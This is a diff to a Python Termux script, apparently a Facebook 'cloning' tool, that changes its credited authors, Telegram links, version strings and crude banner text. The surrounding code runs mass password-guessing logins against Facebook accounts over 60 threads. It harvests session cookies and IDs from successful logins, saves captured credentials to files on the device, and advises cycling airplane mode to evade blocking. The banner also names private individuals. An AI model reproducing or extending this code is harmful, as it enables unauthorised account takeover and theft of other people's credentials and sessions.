@@ -9,7 +9,7 @@ B = '\x1b[10;90m';R = '\x1b[10;91m';G = '\x1b[10;92m';H = '\x1b[10;93m';BL = '\x
 #------------------[ SYTLE ]-----------------#
 dt = '•'
 #------------------[ VERSION ]-----------------#
-version = '1.07'
+version = '3.07'
 #------------------[ LOOP ]-----------------#
 ok = [];cp = [];twf = [];lop = 0;xode = [];plist = [];cpx = [];cokix = [];apkx = [];paswtrh = [];rcd = [];rcdx = [];ugen = [];ugtn = [];ugxn = [];lk = [];togg = []
 #------------------[ CLEAR ]-----------------#
@@ -25,7 +25,7 @@ fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'co
 #------------------[ INSTALL ]-----------------#
 os.system('pkg install sox -y')
 os.system('pkg install espeak')
-os.system('clear');os.system('espeak -a 300 "well,come to,kalyan, King send script free open tool"')
+os.system('clear');os.system('espeak -a 300 "well,come to,AR,Rahim King Use Fucking free tool"')
 #------------------[ DATE ]-----------------#
 dateti = str(datetime.now()).split(' ')[0]
 #------------------[ PROXY ]-----------------#
@@ -134,12 +134,12 @@ logo = f'''\r\r\x1b[0;92m
 ║\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•>\x1b[0;41m[ WORKING WIFI+MOBILE DATA ]\x1b[0;92m\x1b[10;91m<•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[10;91m•\x1b[10;92m•\x1b[0;92m\x1b[10;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \x1b[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\x1b[1;33m 
-\x1b[10;93m╠══[SEND BY                    • \x1b[1;38mKALYAN KING]     ║ 
-\x1b[10;91m╠══[TELIGERM                  • OX CYBER TEAM ]   ║    
-\x1b[10;97m╠══[Github                   • Tutul-King ]   ║   
-\x1b[10;94m╠══[Teligerm                  • https://t.me/+LRlET_sIrUcxMTk1 ]  ║ 
+\x1b[10;93m╠══[SEND BY                    • \x1b[1;38mAR RAHIM KING]     ║ 
+\x1b[10;91m╠══[TELIGERM                  • king Cloning Family]   ║    
+\x1b[10;97m╠══[Github                   • AR Rahim-King ]   ║   
+\x1b[10;94m╠══[All X GF                  •Rotna,Bithi,Sadia,Adiba ]  ║ 
 \x1b[10;95m╠══[TOOLS                    • FREE ]         ║    
-\x1b[10;93m╠══[VERSION                  • 2.1 ]          ║ \x1b[10;92m
+\x1b[10;93m╠══[VERSION                  • 11.2.1 ]          ║ \x1b[10;92m
 \x1b[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\x1b[1;31m'''
 #------------------[ NAME ]-----------------#
 #------------------[ MENU ]-----------------#
@@ -150,8 +150,7 @@ def Main():
     print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m2\x1b[10;97m] \x1b[10;93mCONTACT WITH ADMIN')
     print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m0\x1b[10;97m] \x1b[10;91mEXIT')
     print('\x1b[10;92m┣━\x1b[10;97m=============================================')
-    os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
-    os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
+    os.system('xdg-open https://t.me/rahimking2034')
     ghx = input('\x1b[10;92m┗━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[10;92mCHOOSE \x1b[10;91m:\x1b[10;92m ')
     if ghx in ['A', 'a', '1']:rcd.append('1');rmenu1()
     if ghx in ['B', 'b', '2']:rcd.append('2');rmenu1()
@@ -163,7 +162,7 @@ def rmenu1():
     clear()
     if '1' in rcd:print(f'{BDX}');line()
     if '3' in rcd:print(f'{INDX}');line()
-    if '2' in rcd:print('                [10;92mAdmin Facebook idz');os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1');time.sleep(3)
+    if '2' in rcd:print('                [10;92mAdmin Facebook idz');os.system('xdg-open https://t.me/rahimking2034');time.sleep(3)
     code = input(f'{chc}');print(f'''\x1b[10;97m{'==============================================='}''');print(f'''{LIMITX}''');line();limit = int(input(f'[{G}+{E}] Limit : {G}'));print(f"{W}{'==============================================='}");print(f'{CPG}');line();cx = input(f'{chc}')
     if cx in ['n', 'N', 'no', 'NO', '2']:cpx.append('n')
     else:cpx.append('y')
@@ -177,10 +176,10 @@ def rmenu1():
     with ThreadPool(max_workers=60) as tonxoys:
         tid = str(len(xode));clear()
         print('\x1b[10;92m┏━\x1b[10;97m=============================================')
-        print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[38;5;208m USER NAME\x1b[10;91m :\x1b[10;96m ')
+        print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[38;5;208m USER NAME-----Rahim\x1b[10;91m :\x1b[10;96m ')
         print(f'''\x1b[10;92m┣━{W}[{G}+{W}] \x1b[10;91mYOUR TOTAL ID :\x1b[1;92m ''' + tid)
-        print(f'''\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[10;92m Started Time Date \x1b[10;91m: \x1b[10;93m{dateti}''')
-        print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[38;5;208mUSE YOUR \x1b[10;95mAIRPLANE MODE \x1b[10;97m[\x1b[10;92mON\x1b[10;91m/\x1b[10;92mOFF\x1b[10;97m] \x1b[10;92mAFTER\x1b[10;91m-\x1b[10;92m3 MIN')
+        print(f'''\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m]\x1b[10;92m Fucking Start \x1b[10;91m: \x1b[10;93m{dateti}''')
+        print('\x1b[10;92m┣━\x1b[10;97m[\x1b[10;92m+\x1b[10;97m] \x1b[38;5;208mUSE YOUR \x1b[10;95mAIRPLANE MODE \x1b[10;97m[\x1b[10;92mON\x1b[10;91m/\x1b[10;92mOFF\x1b[10;97m] \x1b[10;92mAFTER\x1b[10;91m-\x1b[10;92m10 MIN')
         print('\x1b[10;92m┗━\x1b[10;97m=============================================')
         for rngx in xode:
             id = code + rngx
@@ -209,8 +208,8 @@ def graphrm(id,psd,tid):
                 ck.update({xk['name']: xk['value']})
             coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
             iid = re.findall('c_user=(.*);xs', coki)[0]
-            print(f'''\r\r\x1b[10;92m[Tutul-Ok💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{tutulx(iid)}''')
-            os.system('espeak -a 300 "Tutul,  Ok,  id"')
+            print(f'''\r\r\x1b[10;92m[Rahim-Ok💚] {iid} | {psw} \x1b[10;91m•> \x1b[10;92m{rahimx(iid)}''')
+            os.system('espeak -a 300 "Rahim,  Ok,  id"')
             ok.append(id)
             open('/sdcard/1T-OK.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '  ------------>>>' + coki + '\n')
             if 'y' in cokix:
@@ -229,10 +228,10 @@ def graphrm(id,psd,tid):
                 iid = lo['error']['error_data']['uid']
                 if iid in ok:pass
                 if 'y' in cpx:
-                    print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;93m[Tutul-Cp] {iid} | {psw}{W}''')
+                    print(f'''\r\r\x1b[10;97m[\x1b[10;92m=\x1b[10;97m]\x1b[10;91m~\x1b[10;93m[Rahim-Cp] {iid} | {psw}{W}''')
                     cp.append(id)
                     os.system('espeak -a 300 "Cp"')
-                    open('/sdcard/1T-CP.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
+                    open('/sdcard/Rahim-CP.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                 break
             else:pass
     lop += 1
